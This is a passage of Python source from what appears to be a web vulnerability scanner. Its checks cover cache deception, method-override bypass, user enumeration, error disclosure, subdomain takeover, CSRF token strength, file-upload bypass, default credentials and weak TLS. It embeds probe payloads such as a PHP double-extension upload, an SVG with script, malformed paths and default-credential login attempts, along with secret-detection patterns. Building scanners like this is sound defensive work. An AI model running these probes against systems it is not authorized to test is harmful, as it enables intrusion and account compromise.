                                finding=f"Web cache deception — dynamic content served at static path [{deception_url}]",
                                severity="high",
                                proof=f"Baseline: {baseline_len}B | Deception: {resp_len}B | Cache: {cache_headers or 'Age: ' + resp.headers.get('Age', '')}",
                                payload=ext,
                            ))
                            break
            except Exception:
                continue
        return findings

    # ── HTTP method override ───────────────────────────────────────────────────

    def _check_method_override(self, sitemap) -> list[ScanFinding]:
        """Test for HTTP method override via X-HTTP-Method-Override header."""
        findings = []
        override_headers = [
            "X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override",
            "X-Original-Method", "_method",
        ]
        for url in list(sitemap.pages.keys())[:5]:
            if self.stop_event.is_set():
                break
            # First check if there's a 403/405 on DELETE
            try:
                time.sleep(self.rate_limit)
                resp_del = self._req("DELETE", url)
                if not resp_del:
                    continue
                if resp_del.status_code not in (403, 405, 401):
                    continue
                # Now try to bypass via method override
                for hdr in override_headers:
                    time.sleep(self.rate_limit)
                    resp_override = self._req("POST", url, headers={hdr: "DELETE"})
                    if resp_override and resp_override.status_code in (200, 204):
                        findings.append(self._make_finding(
                            url=url, method="POST", param=hdr,
                            param_type="header", vuln_type="method_override",
                            finding=f"HTTP method override bypass — {hdr}: DELETE accepted via POST [{url}]",
                            severity="medium",
                            proof=f"Direct DELETE: {resp_del.status_code} | POST+{hdr}: {resp_override.status_code}",
                            payload=f"{hdr}: DELETE",
                        ))
                        break
            except Exception:
                continue
        return findings

    # ── User enumeration ───────────────────────────────────────────────────────

    def _check_user_enumeration(self, sitemap) -> list[ScanFinding]:
        """Detect user enumeration via response differences on login/forgot-password."""
        findings = []
        enum_paths = ["/login", "/signin", "/auth/login", "/api/auth/login",
                      "/forgot-password", "/reset-password", "/api/users"]

        for path in enum_paths:
            if self.stop_event.is_set():
                break
            url = urljoin(self.target, path)
            try:
                # Check if endpoint exists
                resp_check = self._req("GET", url)
                if not resp_check or resp_check.status_code not in (200, 401, 405):
                    continue

                # Test with likely-valid vs definitely-invalid usernames
                time.sleep(self.rate_limit)
                t1 = time.time()
                resp_valid = self.session.post(
                    url, data={"username": "admin", "password": "wrongpass123", "email": "admin@test.com"},
                    timeout=self.timeout, verify=False, allow_redirects=True,
                )
                t1_dur = time.time() - t1

                time.sleep(self.rate_limit)
                t2 = time.time()
                resp_invalid = self.session.post(
                    url, data={"username": "xyznonexistent99", "password": "wrongpass123", "email": "xyznonexistent99@test.com"},
                    timeout=self.timeout, verify=False, allow_redirects=True,
                )
                t2_dur = time.time() - t2

                # Check response body difference
                body_v = resp_valid.text.lower()
                body_i = resp_invalid.text.lower()

                # Different error messages = user enumeration
                enum_signals = [
                    ("incorrect password" in body_v and "user not found" in body_i),
                    ("invalid password" in body_v and "invalid user" in body_i),
                    ("wrong password" in body_v and "no account" in body_i),
                    ("password incorrect" in body_v and "does not exist" in body_i),
                    (resp_valid.status_code != resp_invalid.status_code),
                ]

                if any(enum_signals):
                    findings.append(self._make_finding(
                        url=url, method="POST", param="username",
                        param_type="form", vuln_type="user_enumeration",
                        finding=f"User enumeration — different responses for valid/invalid usernames [{url}]",
                        severity="medium",
                        proof=f"Valid user: {resp_valid.status_code} ({len(body_v)}B) | Invalid: {resp_invalid.status_code} ({len(body_i)}B)",
                        payload="admin vs xyznonexistent99",
                    ))

                # Timing-based enumeration (>200ms difference)
                if abs(t1_dur - t2_dur) > 0.2:
                    findings.append(self._make_finding(
                        url=url, method="POST", param="username",
                        param_type="form", vuln_type="user_enumeration",
                        finding=f"Timing-based user enumeration — {abs(t1_dur-t2_dur)*1000:.0f}ms response difference [{url}]",
                        severity="medium",
                        proof=f"Valid user: {t1_dur*1000:.0f}ms | Invalid: {t2_dur*1000:.0f}ms | Δ: {abs(t1_dur-t2_dur)*1000:.0f}ms",
                        payload="Timing analysis",
                        resp_time_ms=abs(t1_dur - t2_dur) * 1000,
                    ))
                    break
            except Exception:
                continue
        return findings

    # ── Error information disclosure ───────────────────────────────────────────

    _ERROR_PATTERNS = re.compile(
        r"(?:Traceback \(most recent|at .+\.java:\d+|"
        r"Microsoft \.NET Framework|Stack Trace:|"
        r"Fatal error:.*on line \d+|"
        r"Parse error:.*on line \d+|"
        r"Warning:.*on line \d+|"
        r"Exception in thread|"
        r"SQLSTATE\[|PDOException|"
        r"pg_query\(\)|mysql_|mysqli_|"
        r"System\.Web\.HttpException|"
        r"<b>Warning</b>:.*<b>|"
        r"<pre class=\"exception\"|"
        r"Whoops! There was an error|"
        r"RuntimeError at /|"
        r"You're seeing this error because|"
        r"OperationalError at /|"
        r"Application Trace|Framework Trace)",
        re.I,
    )

    def _check_error_disclosure(self, sitemap) -> list[ScanFinding]:
        """Trigger error conditions and check for information leaks."""
        findings = []
        # Trigger errors via malformed input
        error_triggers = [
            ("GET", f"{self.target}/'\"\\", "path"),
            ("GET", f"{self.target}/%00%ff%fe", "null_bytes"),
            ("GET", f"{self.target}/999999999999", "numeric_overflow"),
            ("GET", f"{self.target}/.%00.php", "null_extension"),
            ("GET", f"{self.target}/<script>", "html_in_path"),
        ]
        # Baseline: check what the normal root response looks like
        baseline_has_error_pattern = False
        try:
            bl = self._req("GET", self.target)
            if bl:
                baseline_has_error_pattern = bool(self._ERROR_PATTERNS.search(bl.text[:5000]))
        except Exception:
            pass

        for method, url, trigger_type in error_triggers:
            if self.stop_event.is_set():
                break
            try:
                time.sleep(self.rate_limit)
                resp = self._req(method, url)
                if not resp:
                    continue
                body = resp.text[:5000]
                m = self._ERROR_PATTERNS.search(body)
                # Require 4xx/5xx, matching error pattern, AND pattern absent in baseline
                if resp.status_code >= 400 and m and not baseline_has_error_pattern:
                    findings.append(self._make_finding(
                        url=url, method=method, param=trigger_type,
                        param_type="path", vuln_type="error_disclosure",
                        finding=f"Detailed error page exposes internal information [{url}]",
                        severity="medium",
                        proof=f"Pattern: {m.group()[:80]} | Status: {resp.status_code} | Excerpt: {body[:200].strip()}",
                        payload=trigger_type,
                        status_code=resp.status_code,
                    ))
                    break  # One finding is enough
            except Exception:
                continue

        # Check for debug mode indicators
        debug_paths = ["/debug", "/_debug", "/__debug__", "/elmah.axd",
                       "/trace.axd", "/actuator/env", "/actuator/configprops"]
        for path in debug_paths:
            if self.stop_event.is_set():
                break
            url = urljoin(self.target, path)
            try:
                resp = self._req("GET", url)
                if resp and resp.status_code == 200 and len(resp.text) > 100:
                    findings.append(self._make_finding(
                        url=url, method="GET", param="path",
                        param_type="path", vuln_type="error_disclosure",
                        finding=f"Debug/diagnostic endpoint accessible [{url}]",
                        severity="medium",
                        proof=resp.text[:200].strip(),
                        payload=path,
                    ))
            except Exception:
                continue
        return findings

    # ── Mixed content detection ────────────────────────────────────────────────

    _HTTP_RESOURCE_PATTERN = re.compile(
        r'(?:src|href|action)\s*=\s*["\']http://[^"\']+["\']',
        re.I,
    )

    def _check_mixed_content(self, sitemap) -> list[ScanFinding]:
        """Detect HTTP resources loaded on HTTPS pages."""
        findings = []
        if not self.target.startswith("https://"):
            return findings  # Only applies to HTTPS sites
        checked = 0
        for url, page in sitemap.pages.items():
            if self.stop_event.is_set() or checked >= 10:
                break
            if not url.startswith("https://"):
                continue
            checked += 1
            body = page.get("body", "")
            if not body:
                try:
                    resp = self._req("GET", url)
                    if resp:
                        body = resp.text
                except Exception:
                    continue
            if not body:
                continue
            http_refs = self._HTTP_RESOURCE_PATTERN.findall(body)
            if http_refs:
                findings.append(self._make_finding(
                    url=url, method="GET", param="resource",
                    param_type="body", vuln_type="mixed_content",
                    finding=f"Mixed content — {len(http_refs)} HTTP resource(s) on HTTPS page [{url}]",
                    severity="medium",
                    proof="; ".join(http_refs[:3]),
                    payload="",
                ))
        return findings

    # ── Insecure forms & password autocomplete ─────────────────────────────────

    _FORM_PATTERN = re.compile(r'<form[^>]*action\s*=\s*["\']http://[^"\']*["\']', re.I)
    _PASSWORD_AUTOCOMPLETE = re.compile(
        r'<input[^>]*type\s*=\s*["\']password["\'][^>]*>',
        re.I,
    )

    def _check_insecure_forms(self, sitemap) -> list[ScanFinding]:
        """Check for forms submitting to HTTP and password autocomplete issues."""
        findings = []
        checked = 0
        for url, page in sitemap.pages.items():
            if self.stop_event.is_set() or checked >= 10:
                break
            checked += 1
            body = page.get("body", "")
            if not body:
                try:
                    resp = self._req("GET", url)
                    if resp:
                        body = resp.text
                except Exception:
                    continue
            if not body:
                continue

            # Insecure form action (HTTP on HTTPS page)
            if url.startswith("https://"):
                http_forms = self._FORM_PATTERN.findall(body)
                for form in http_forms[:2]:
                    findings.append(self._make_finding(
                        url=url, method="GET", param="form_action",
                        param_type="body", vuln_type="insecure_form_action",
                        finding=f"Form submits to HTTP on HTTPS page [{url}]",
                        severity="medium",
                        proof=form[:120],
                        payload="",
                    ))

            # Password autocomplete not disabled
            pwd_fields = self._PASSWORD_AUTOCOMPLETE.findall(body)
            for pwd in pwd_fields:
                pwd_lower = pwd.lower()
                if 'autocomplete' not in pwd_lower or 'autocomplete="on"' in pwd_lower:
                    findings.append(self._make_finding(
                        url=url, method="GET", param="password",
                        param_type="body", vuln_type="password_autocomplete",
                        finding=f"Password field allows autocomplete [{url}]",
                        severity="low",
                        proof=pwd[:100],
                        payload="",
                    ))
                    break  # One per page
        return findings

    # ── Subdomain takeover detection ───────────────────────────────────────────

    _TAKEOVER_FINGERPRINTS = [
        (r"There isn't a GitHub Pages site here", "GitHub Pages"),
        (r"NoSuchBucket", "AWS S3"),
        (r"herokucdn\.com/error-pages", "Heroku"),
        (r"The specified bucket does not exist", "Google Cloud Storage"),
        (r"Sorry, this shop is currently unavailable", "Shopify"),
        (r"Do you want to register", "WordPress.com"),
        (r"The feed has not been found", "Feedpress"),
        (r"This UserVoice subdomain is currently available", "UserVoice"),
        (r"project not found", "Surge.sh"),
        (r"Unrecognized domain", "Bitbucket"),
        (r"Repository not found", "Bitbucket"),
        (r"<title>Fastly error: unknown domain", "Fastly"),
        (r"The request could not be satisfied", "AWS CloudFront"),
        (r"CNAME Cross-User Banned", "Pantheon"),
        (r"404 Blog is not found", "Tumblr"),
    ]

    def _check_subdomain_takeover(self, sitemap) -> list[ScanFinding]:
        """Check for subdomain takeover indicators in responses."""
        findings = []
        parsed = urlparse(self.target)
        target_host = parsed.hostname or ""

        # Only check subdomains found in sitemap links
        seen = set()
        urls_to_check = [self.target]
        for url in list(sitemap.pages.keys())[:20]:
            p = urlparse(url)
            host = p.hostname or ""
            if host and host != target_host and host.endswith(target_host) and host not in seen:
                seen.add(host)
                urls_to_check.append(f"{p.scheme}://{host}")

        for url in urls_to_check[:10]:
            if self.stop_event.is_set():
                break
            try:
                resp = self._req("GET", url)
                if not resp:
                    continue
                body = resp.text[:5000]
                for pattern, service in self._TAKEOVER_FINGERPRINTS:
                    if re.search(pattern, body, re.I):
                        findings.append(self._make_finding(
                            url=url, method="GET", param="CNAME",
                            param_type="dns", vuln_type="subdomain_takeover",
                            finding=f"Potential subdomain takeover — {service} fingerprint detected [{url}]",
                            severity="high",
                            proof=body[:200].strip(),
                            payload=service,
                        ))
                        break
            except Exception:
                continue
        return findings

    # ── Open API / Swagger exposure ────────────────────────────────────────────

    def _check_open_api_exposure(self, sitemap) -> list[ScanFinding]:
        """Check for exposed API documentation endpoints."""
        findings = []
        api_paths = [
            "/swagger.json", "/swagger-ui.html", "/swagger-ui/", "/swagger/",
            "/api-docs", "/api-docs.json", "/v2/api-docs", "/v3/api-docs",
            "/openapi.json", "/openapi.yaml", "/openapi/",
            "/redoc", "/graphql", "/graphiql",
            "/docs", "/api/docs", "/api/swagger",
            "/.well-known/openapi.yaml",
            "/swagger-resources", "/api/swagger-resources",
        ]
        for path in api_paths:
            if self.stop_event.is_set():
                break
            url = urljoin(self.target, path)
            try:
                time.sleep(self.rate_limit)
                resp = self._req("GET", url)
                if not resp or resp.status_code != 200:
                    continue
                body = resp.text[:3000]
                is_api_doc = (
                    '"swagger"' in body.lower() or
                    '"openapi"' in body.lower() or
                    "swagger-ui" in body.lower() or
                    '"paths"' in body or
                    '"info"' in body and '"title"' in body
                )
                if is_api_doc:
                    findings.append(self._make_finding(
                        url=url, method="GET", param="path",
                        param_type="path", vuln_type="open_api_exposure",
                        finding=f"API documentation exposed [{url}]",
                        severity="medium",
                        proof=body[:200].strip(),
                        payload=path,
                    ))
                    break  # One finding is enough
            except Exception:
                continue
        return findings

    # ── TRACE method / XST ─────────────────────────────────────────────────────

    def _check_trace_xst(self, sitemap) -> list[ScanFinding]:
        """Test if TRACE method is enabled (Cross-Site Tracing risk)."""
        findings = []
        try:
            # Send TRACE with a custom header containing a "cookie"
            resp = self._req("TRACE", self.target, headers={
                "X-Test-Cookie": "DAST-TRACE-TEST=secret123",
            })
            if resp and resp.status_code == 200:
                body = resp.text[:2000]
                if "DAST-TRACE-TEST" in body or "secret123" in body:
                    findings.append(self._make_finding(
                        url=self.target, method="TRACE", param="method",
                        param_type="method", vuln_type="trace_xst",
                        finding=f"TRACE method enabled — reflects request headers (XST risk) [{self.target}]",
                        severity="medium",
                        proof=body[:200],
                        payload="TRACE",
                    ))
                elif resp.headers.get("content-type", "").startswith("message/http"):
                    findings.append(self._make_finding(
                        url=self.target, method="TRACE", param="method",
                        param_type="method", vuln_type="trace_xst",
                        finding=f"TRACE method enabled [{self.target}]",
                        severity="low",
                        proof=f"TRACE returned 200 with content-type: {resp.headers.get('content-type', '')}",
                        payload="TRACE",
                    ))
        except Exception:
            pass

        # Also check OPTIONS to enumerate allowed methods
        try:
            resp_opt = self._req("OPTIONS", self.target)
            if resp_opt:
                allow = resp_opt.headers.get("Allow", "")
                if "TRACE" in allow.upper():
                    findings.append(self._make_finding(
                        url=self.target, method="OPTIONS", param="Allow",
                        param_type="header", vuln_type="trace_xst",
                        finding=f"TRACE listed in Allow header [{self.target}]",
                        severity="low",
                        proof=f"Allow: {allow}",
                        payload="OPTIONS → TRACE in Allow",
                    ))
        except Exception:
            pass
        return findings

    # ── CSRF token strength ────────────────────────────────────────────────────

    def _check_csrf_token_strength(self, sitemap) -> list[ScanFinding]:
        """Analyze CSRF token entropy and predictability."""
        findings = []
        import math
        from collections import Counter

        # Collect CSRF tokens from forms
        csrf_names = re.compile(
            r'name\s*=\s*["\']([^"\']*(?:csrf|xsrf|token|_token|authenticity)[^"\']*)["\']',
            re.I,
        )
        tokens: list[str] = []

        for url in list(sitemap.pages.keys())[:10]:
            if self.stop_event.is_set():
                break
            try:
                resp = self._req("GET", url)
                if not resp or resp.status_code != 200:
                    continue
                body = resp.text
                # Find CSRF token input fields
                for match in csrf_names.finditer(body):
                    field_name = match.group(1)
                    # Find the value
                    val_pattern = re.compile(
                        rf'name\s*=\s*["\']{ re.escape(field_name)}["\'][^>]*value\s*=\s*["\']([^"\']+)["\']',
                        re.I,
                    )
                    val_match = val_pattern.search(body)
                    if val_match:
                        tokens.append(val_match.group(1))
            except Exception:
                continue

        if len(tokens) >= 2:
            # Check for duplicate tokens (static CSRF = no protection)
            unique = set(tokens)
            if len(unique) == 1:
                findings.append(self._make_finding(
                    url=self.target, method="GET", param="csrf_token",
                    param_type="form", vuln_type="csrf_token_weak",
                    finding=f"Static CSRF token — same value across {len(tokens)} pages",
                    severity="high",
                    proof=f"Token: {tokens[0][:40]}...",
                    payload="",
                ))
            # Check entropy
            for token in unique:
                if len(token) < 16:
                    findings.append(self._make_finding(
                        url=self.target, method="GET", param="csrf_token",
                        param_type="form", vuln_type="csrf_token_weak",
                        finding=f"Short CSRF token ({len(token)} chars) — brute-forceable",
                        severity="high",
                        proof=f"Token: {token}",
                        payload="",
                    ))
                    break
                # Shannon entropy
                freq = Counter(token)
                entropy = -sum((c / len(token)) * math.log2(c / len(token))
                               for c in freq.values() if c > 0)
                if entropy < 3.0:
                    findings.append(self._make_finding(
                        url=self.target, method="GET", param="csrf_token",
                        param_type="form", vuln_type="csrf_token_weak",
                        finding=f"Low entropy CSRF token ({entropy:.1f} bpc) — predictable",
                        severity="high",
                        proof=f"Token: {token[:40]} | Entropy: {entropy:.2f} bits/char",
                        payload="",
                    ))
                    break
        return findings

    # ── File upload validation ─────────────────────────────────────────────────

    def _check_file_upload(self, sitemap) -> list[ScanFinding]:
        """Detect file upload endpoints and test content-type bypass."""
        findings = []
        # Find file upload forms
        upload_pattern = re.compile(r'<input[^>]*type\s*=\s*["\']file["\'][^>]*>', re.I)

        for url, page in list(sitemap.pages.items())[:15]:
            if self.stop_event.is_set():
                break
            body = page.get("body", "")
            if not body:
                try:
                    resp = self._req("GET", url)
                    if resp:
                        body = resp.text
                except Exception:
                    continue
            if not body or not upload_pattern.search(body):
                continue

            # Found file upload — extract form action
            form_match = re.search(r'<form[^>]*action\s*=\s*["\']([^"\']*)["\']', body, re.I)
            if not form_match:
                continue
            action = form_match.group(1)
            if not action.startswith("http"):
                action = urljoin(url, action)

            # Test 1: Upload with double extension
            try:
                time.sleep(self.rate_limit)
                files = {"file": ("test.php.jpg", b"<?php echo 'test'; ?>", "image/jpeg")}
                resp = self.session.post(
                    action, files=files, timeout=self.timeout,
                    verify=False, allow_redirects=True,
                )
                if resp.status_code in (200, 201, 302) and "error" not in resp.text.lower()[:500]:
                    findings.append(self._make_finding(
                        url=action, method="POST", param="file",
                        param_type="file", vuln_type="file_upload_bypass",
                        finding=f"File upload accepts double extension (test.php.jpg) [{action}]",
                        severity="high",
                        proof=f"Status: {resp.status_code} | File: test.php.jpg with image/jpeg",
                        payload="test.php.jpg",
                    ))
            except Exception:
                pass

            # Test 2: Upload with spoofed content-type
            try:
                time.sleep(self.rate_limit)
                files = {"file": ("test.svg", b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', "image/svg+xml")}
                resp = self.session.post(
                    action, files=files, timeout=self.timeout,
                    verify=False, allow_redirects=True,
                )
                if resp.status_code in (200, 201, 302) and "error" not in resp.text.lower()[:500]:
                    findings.append(self._make_finding(
                        url=action, method="POST", param="file",
                        param_type="file", vuln_type="file_upload_bypass",
                        finding=f"File upload accepts SVG with embedded script [{action}]",
                        severity="high",
                        proof=f"Status: {resp.status_code} | File: test.svg with script",
                        payload="SVG+script",
                    ))
            except Exception:
                pass
        return findings

    # ── Clickjacking active test ───────────────────────────────────────────────

    def _check_clickjacking(self, sitemap) -> list[ScanFinding]:
        """Check if pages are frameable (no X-Frame-Options or CSP frame-ancestors)."""
        findings = []
        for url in list(sitemap.pages.keys())[:5]:
            if self.stop_event.is_set():
                break
            try:
                resp = self._req("GET", url)
                if not resp or resp.status_code != 200:
                    continue
                hdrs = {k.lower(): v for k, v in resp.headers.items()}
                xfo = hdrs.get("x-frame-options", "")
                csp = hdrs.get("content-security-policy", "")
                has_frame_protection = (
                    xfo.upper() in ("DENY", "SAMEORIGIN") or
                    "frame-ancestors" in csp.lower()
                )
                if not has_frame_protection and "text/html" in hdrs.get("content-type", ""):
                    findings.append(self._make_finding(
                        url=url, method="GET", param="X-Frame-Options",
                        param_type="header", vuln_type="clickjacking",
                        finding=f"Page is frameable — no X-Frame-Options or CSP frame-ancestors [{url}]",
                        severity="medium",
                        proof=f"XFO: {xfo or 'absent'} | CSP frame-ancestors: {'present' if 'frame-ancestors' in csp.lower() else 'absent'}",
                        payload="",
                    ))
                    break  # One finding is sufficient
            except Exception:
                continue
        return findings

    # ── CORS preflight cache abuse ─────────────────────────────────────────────

    def _check_cors_preflight_cache(self, sitemap) -> list[ScanFinding]:
        """Test if preflight responses have excessively long max-age or vary issues."""
        findings = []
        parsed = urlparse(self.target)
        target_host = parsed.hostname or ""
        for url in list(sitemap.pages.keys())[:3]:
            if self.stop_event.is_set():
                break
            try:
                # Test with different request methods to see if preflight is properly scoped
                for method in ["PUT", "DELETE", "PATCH"]:
                    resp = self._req("OPTIONS", url, headers={
                        "Origin": f"https://{target_host}",
                        "Access-Control-Request-Method": method,
                        "Access-Control-Request-Headers": "Authorization, Content-Type",
                    })
                    if not resp:
                        continue
                    acam = resp.headers.get("Access-Control-Allow-Methods", "")
                    if "*" in acam:
                        findings.append(self._make_finding(
                            url=url, method="OPTIONS", param="ACAM",
                            param_type="header", vuln_type="cors_preflight",
                            finding=f"CORS preflight allows ALL methods (wildcard) [{url}]",
                            severity="medium",
                            proof=f"Access-Control-Allow-Methods: {acam}",
                            payload=f"OPTIONS for {method}",
                        ))
                        break
                    acah = resp.headers.get("Access-Control-Allow-Headers", "")
                    if "*" in acah:
                        findings.append(self._make_finding(
                            url=url, method="OPTIONS", param="ACAH",
                            param_type="header", vuln_type="cors_preflight",
                            finding=f"CORS preflight allows ALL headers (wildcard) [{url}]",
                            severity="medium",
                            proof=f"Access-Control-Allow-Headers: {acah}",
                            payload=f"OPTIONS for {method}",
                        ))
                        break
            except Exception:
                continue
        return findings

    # ── HTTP Strict Transport Security preload check ───────────────────────────

    def _check_hsts_preload(self, sitemap) -> list[ScanFinding]:
        """Check HSTS configuration quality beyond just presence."""
        findings = []
        if not self.target.startswith("https://"):
            return findings
        try:
            resp = self._req("GET", self.target)
            if not resp:
                return findings
            hsts = resp.headers.get("Strict-Transport-Security", "")
            if hsts:
                hsts_lower = hsts.lower()
                # Check max-age is sufficiently long (< 6 months is weak)
                import re as _re
                ma = _re.search(r"max-age=(\d+)", hsts_lower)
                if ma:
                    age = int(ma.group(1))
                    if age < 15768000:  # < 6 months
                        findings.append(self._make_finding(
                            url=self.target, method="GET", param="HSTS",
                            param_type="header", vuln_type="missing_hsts",
                            finding=f"HSTS max-age too short: {age}s ({age//86400}d) — recommend >= 31536000 (1yr)",
                            severity="medium",
                            proof=f"Strict-Transport-Security: {hsts}",
                            payload="",
                        ))
                # Check for includeSubDomains
                if "includesubdomains" not in hsts_lower:
                    findings.append(self._make_finding(
                        url=self.target, method="GET", param="HSTS",
                        param_type="header", vuln_type="missing_hsts",
                        finding=f"HSTS missing includeSubDomains — subdomains not protected",
                        severity="low",
                        proof=f"Strict-Transport-Security: {hsts}",
                        payload="",
                    ))
            else:
                # No HTTPS redirect check
                try:
                    http_url = self.target.replace("https://", "http://", 1)
                    http_resp = self.session.get(http_url, timeout=5, verify=False, allow_redirects=False)
                    if http_resp.status_code not in (301, 302, 307, 308):
                        findings.append(self._make_finding(
                            url=http_url, method="GET", param="redirect",
                            param_type="transport", vuln_type="missing_hsts",
                            finding=f"No HTTP→HTTPS redirect and no HSTS header",
                            severity="high",
                            proof=f"HTTP {http_url} returned {http_resp.status_code} instead of redirect",
                            payload="",
                        ))
                except Exception:
                    pass
        except Exception:
            pass
        return findings

    # ── Web storage / sensitive data in JavaScript ─────────────────────────────

    def _check_sensitive_data_exposure(self, sitemap) -> list[ScanFinding]:
        """Check for sensitive data hardcoded in JavaScript."""
        findings = []
        sensitive_patterns = re.compile(
            r"(?:"
            r"(?:api[_-]?key|apikey|api_secret)\s*[:=]\s*['\"][A-Za-z0-9_\-]{16,}['\"]|"
            r"(?:aws_access_key_id|AKIA)[A-Z0-9]{16,}|"
            r"(?:password|passwd|pwd)\s*[:=]\s*['\"][^'\"]{4,}['\"]|"
            r"(?:secret|token|auth)\s*[:=]\s*['\"][A-Za-z0-9_\-]{20,}['\"]|"
            r"(?:BEGIN (?:RSA |DSA |EC )?PRIVATE KEY)|"
            r"(?:ghp_[A-Za-z0-9]{36})|"  # GitHub PAT
            r"(?:sk-[A-Za-z0-9]{32,})|"  # OpenAI key
            r"(?:Bearer\s+eyJ[A-Za-z0-9_-]{10,})"  # Hardcoded JWT
            r")",
            re.I,
        )
        checked = 0
        for url, page in sitemap.pages.items():
            if self.stop_event.is_set() or checked >= 10:
                break
            checked += 1
            body = page.get("body", "")
            if not body:
                try:
                    resp = self._req("GET", url)
                    if resp:
                        body = resp.text
                except Exception:
                    continue
            if not body:
                continue
            matches = sensitive_patterns.findall(body)
            if matches:
                # Redact actual values
                redacted = [m[:20] + "..." if len(m) > 20 else m for m in matches[:3]]
                findings.append(self._make_finding(
                    url=url, method="GET", param="script",
                    param_type="body", vuln_type="info_disclosure",
                    finding=f"Sensitive data in JavaScript — {len(matches)} potential secret(s) [{url}]",
                    severity="high",
                    proof=f"Matches: {'; '.join(redacted)}",
                    payload="",
                ))
        return findings

    # ── Default credentials ───────────────────────────────────────────────────

    def _check_default_credentials(self, sitemap) -> list[ScanFinding]:
        findings = []
        login_paths = ["/login", "/admin", "/admin/login", "/wp-admin/",
                       "/phpmyadmin/", "/manager/html", "/console"]

        for path in login_paths:
            if self.stop_event.is_set():
                break
            url = urljoin(self.target, path)
            # Check if endpoint exists first
            try:
                head = self.session.get(url, timeout=5, verify=False, allow_redirects=True)
                if head.status_code not in (200, 401, 403):
                    continue
            except Exception:
                continue

            for username, password in self.DEFAULT_CREDS[:8]:
                try:
                    time.sleep(self.rate_limit * 2)
                    resp = self.session.post(
                        url,
                        data={"username": username, "password": password,
                              "user": username, "pass": password},
                        timeout=self.timeout, verify=False, allow_redirects=True,
                    )
                    # Heuristics for successful login
                    body_l = resp.text.lower()
                    success_signals = [
                        "dashboard", "welcome", "logout", "sign out",
                        "admin panel", "control panel", "settings", "profile",
                    ]
                    fail_signals = [
                        "invalid", "incorrect", "wrong", "failed",
                        "error", "denied", "login", "sign in",
                    ]
                    has_success = any(s in body_l for s in success_signals)
                    has_fail    = any(s in body_l for s in fail_signals)

                    if resp.status_code == 200 and has_success and not has_fail:
                        findings.append(self._make_finding(
                            url=url, method="POST", param="username",
                            param_type="form", vuln_type="default_creds",
                            finding=f"Default credentials CONFIRMED — {username}/{password} grants access [{url}]",
                            severity="critical",
                            proof=f"POST {url} → {resp.status_code} | Body signals: {[s for s in success_signals if s in body_l]}",
                            payload=f"username={username}&password={password}",
                        ))
                        break
                except Exception:
                    continue
        return findings

    def _check_weak_tls(self, sitemap) -> list[ScanFinding]:
        """Detect servers accepting deprecated TLS/SSL protocol versions."""
        import ssl
        import socket

        findings = []
        seen_hosts: set[tuple[str, int]] = set()

        for page in sitemap.pages:
            if self.stop_event.is_set():
                break
            page_url = page.url if hasattr(page, 'url') else page
            parsed = urlparse(page_url)
            if parsed.scheme != "https":
                continue
            host = parsed.hostname
            port = parsed.port or 443
            if not host or (host, port) in seen_hosts:
                continue
            seen_hosts.add((host, port))

            weak_protocols = [
                ("SSLv3", "PROTOCOL_SSLv3"),
                ("TLSv1.0", "PROTOCOL_TLSv1"),
                ("TLSv1.1", "PROTOCOL_TLSv1_1"),
            ]

            for proto_label, proto_attr in weak_protocols:
                if self.stop_event.is_set():
                    break

                # Strategy 1: use legacy protocol constant if available
                proto_const = getattr(ssl, proto_attr, None)
                if proto_const is not None:
                    try:
                        ctx = ssl.SSLContext(proto_const)
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        with socket.create_connection((host, port), timeout=self.timeout) as sock:
                            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                                negotiated = ssock.version()
                                findings.append(self._make_finding(
                                    url=f"https://{host}:{port}",
                                    method="CONNECT",
                                    param="",
                                    param_type="tls",
                                    vuln_type="weak_tls",
                                    finding=f"Server accepts deprecated {proto_label} (negotiated {negotiated})",
                                    severity="high",
                                    proof=f"TLS handshake succeeded with {proto_label} on {host}:{port}",
                                    payload=proto_label,
                                ))
                                continue
                    except (ssl.SSLError, OSError):
                        continue
                    except AttributeError:
                        pass

                # Strategy 2: use minimum_version / maximum_version on TLS_CLIENT
                try:
                    version_enum = {
                        "SSLv3": getattr(ssl, "TLSVersion", None) and ssl.TLSVersion.SSLv3,
                        "TLSv1.0": getattr(ssl, "TLSVersion", None) and ssl.TLSVersion.TLSv1,
                        "TLSv1.1": getattr(ssl, "TLSVersion", None) and ssl.TLSVersion.TLSv1_1,
                    }.get(proto_label)

                    if version_enum is None:
                        continue

                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    ctx.minimum_version = version_enum
                    ctx.maximum_version = version_enum
                    with socket.create_connection((host, port), timeout=self.timeout) as sock:
                        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                            negotiated = ssock.version()
                            findings.append(self._make_finding(
                                url=f"https://{host}:{port}",
                                method="CONNECT",
                                param="",
                                param_type="tls",
                                vuln_type="weak_tls",
                                finding=f"Server accepts deprecated {proto_label} (negotiated {negotiated})",
                                severity="high",
                                proof=f"TLS handshake succeeded with {proto_label} on {host}:{port}",
                                payload=proto_label,
                            ))
                except (ssl.SSLError, OSError, AttributeError, ValueError):
                    continue

        return findings

    def _check_weak_ciphers(self, sitemap) -> list[ScanFinding]:
        """Detect servers accepting weak or broken cipher suites."""
        import ssl
        import socket

        findings = []
        seen_hosts: set[tuple[str, int]] = set()

        # Cipher substrings that indicate weak algorithms
        weak_cipher_strings = [
            ("RC4", "RC4"),
            ("DES-CBC", "DES"),
            ("3DES", "DES-CBC3"),
            ("NULL", "NULL"),
            ("EXPORT", "EXPORT"),
            ("MD5", "MD5"),
        ]

        # OpenSSL cipher string to request only weak suites
        weak_openssl_suites = [
            "RC4",
            "DES",
            "3DES",
            "NULL",
            "EXPORT",
            "MD5",
        ]

        for page in sitemap.pages:
            if self.stop_event.is_set():
                break
            page_url = page.url if hasattr(page, 'url') else page
            parsed = urlparse(page_url)
            if parsed.scheme != "https":
                continue
            host = parsed.hostname
            port = parsed.port or 443
            if not host or (host, port) in seen_hosts:
                continue
            seen_hosts.add((host, port))

            # First: check the default-negotiated cipher for known weaknesses
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                with socket.create_connection((host, port), timeout=self.timeout) as sock:
                    with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                        cipher_info = ssock.cipher()  # (name, version, bits)
                        if cipher_info:
                            cipher_name = cipher_info[0].upper()
